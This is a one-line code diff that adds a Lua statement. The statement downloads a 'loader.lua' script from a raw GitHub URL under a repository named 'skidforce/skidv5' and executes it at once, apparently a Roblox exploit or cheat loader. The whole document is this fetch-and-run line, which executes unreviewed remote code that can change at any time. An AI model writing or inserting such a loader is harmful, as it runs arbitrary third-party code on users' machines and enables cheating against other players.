@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/skidforce/skidv5/refs/heads/main/loader.lua", true))()
